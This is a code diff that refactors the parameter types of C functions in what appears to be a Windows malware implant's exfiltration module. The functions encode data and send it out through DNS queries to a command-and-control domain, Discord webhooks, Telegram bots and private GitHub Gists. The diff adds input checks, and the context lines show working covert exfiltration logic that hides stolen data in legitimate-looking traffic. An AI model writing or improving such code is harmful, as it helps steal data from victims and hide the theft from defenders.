@@ -216,13 +216,16 @@ bool jocky_exfil_front(const char*    front_host,
  * DNS responses are ignored; only the queries carry data.
  */
 bool jocky_exfil_dns(const char* c2_domain,
-                      const uint8_t* data, size_t data_len)
+                      const int8_t* data, int32_t size)
 {
+    if (!c2_domain || !data || size <= 0) return false;
+    size_t data_len = (size_t)size;
+    const uint8_t* udata = (const uint8_t*)data;
     for (size_t offset = 0; offset < data_len; ) {
         size_t chunk_sz = (data_len - offset < 10) ? (data_len - offset) : 10;
 
         char b32[17];  /* 10 bytes → 16 base32 chars + NUL */
-        b32_encode(data + offset, chunk_sz, b32);
+        b32_encode(udata + offset, chunk_sz, b32);
 
         char fqdn[512];
         DWORD seq = (DWORD)(offset / 10) & 0xFFFF;
@@ -257,9 +260,12 @@ bool jocky_exfil_dns(const char* c2_domain,
  * Discord limits message content to 2000 characters.  Data larger than
  * ~1500 bytes is automatically split across multiple webhook calls.
  */
-bool jocky_exfil_discord(const char*    webhook_url,
-                          const uint8_t* data, size_t data_len)
+bool jocky_exfil_discord(const char* webhook_url,
+                          const int8_t* data, int32_t size)
 {
+    if (!webhook_url || !data || size <= 0) return false;
+    size_t data_len = (size_t)size;
+    const uint8_t* udata = (const uint8_t*)data;
     /* Parse host and path from the webhook URL */
     wchar_t wurl[1024];
     MultiByteToWideChar(CP_UTF8, 0, webhook_url, -1, wurl, 1024);
@@ -281,7 +287,7 @@ bool jocky_exfil_discord(const char*    webhook_url,
         size_t b64_cap  = ((chunk_sz + 2) / 3) * 4 + 1;
         char*  b64_buf  = (char*)HeapAlloc(GetProcessHeap(), 0, b64_cap);
         if (!b64_buf) return false;
-        b64_encode(data + offset, chunk_sz, b64_buf);
+        b64_encode(udata + offset, chunk_sz, b64_buf);
 
         /* {"content":"<b64>"} */
         size_t json_cap = b64_cap + 16;
@@ -312,10 +318,13 @@ bool jocky_exfil_discord(const char*    webhook_url,
  * Telegram limits message text to 4096 chars.  Data larger than ~3000 bytes
  * is split across multiple sendMessage calls.
  */
-bool jocky_exfil_telegram(const char*    bot_token,
-                           const char*    chat_id,
-                           const uint8_t* data, size_t data_len)
+bool jocky_exfil_telegram(const char* bot_token,
+                           const char* chat_id,
+                           const int8_t* data, int32_t size)
 {
+    if (!bot_token || !chat_id || !data || size <= 0) return false;
+    size_t data_len = (size_t)size;
+    const uint8_t* udata = (const uint8_t*)data;
     const size_t CHUNK = 3000;
     bool ok = true;
 
@@ -325,7 +334,7 @@ bool jocky_exfil_telegram(const char*    bot_token,
         size_t b64_cap = ((chunk_sz + 2) / 3) * 4 + 1;
         char*  b64_buf = (char*)HeapAlloc(GetProcessHeap(), 0, b64_cap);
         if (!b64_buf) return false;
-        b64_encode(data + offset, chunk_sz, b64_buf);
+        b64_encode(udata + offset, chunk_sz, b64_buf);
 
         /* {"chat_id":"<id>","text":"<b64>"} */
         size_t json_cap = b64_cap + strlen(chat_id) + 32;
@@ -365,14 +374,17 @@ bool jocky_exfil_telegram(const char*    bot_token,
  * Creates or overwrites a file named "d.txt" inside the Gist.
  * The Gist can be private (created with public:false).
  */
-bool jocky_exfil_github(const char*    token,
-                         const char*    gist_id,
-                         const uint8_t* data, size_t data_len)
+bool jocky_exfil_github(const char* token,
+                         const char* gist_id,
+                         const int8_t* data, int32_t size)
 {
+    if (!token || !gist_id || !data || size <= 0) return false;
+    size_t data_len = (size_t)size;
+    const uint8_t* udata = (const uint8_t*)data;
     size_t b64_cap = ((data_len + 2) / 3) * 4 + 1;
     char*  b64_buf = (char*)HeapAlloc(GetProcessHeap(), 0, b64_cap);
     if (!b64_buf) return false;
-    b64_encode(data, data_len, b64_buf);
+    b64_encode(udata, data_len, b64_buf);
 
     /* {"files":{"d.txt":{"content":"<b64>"}}} */
     size_t json_cap = b64_cap + 64;
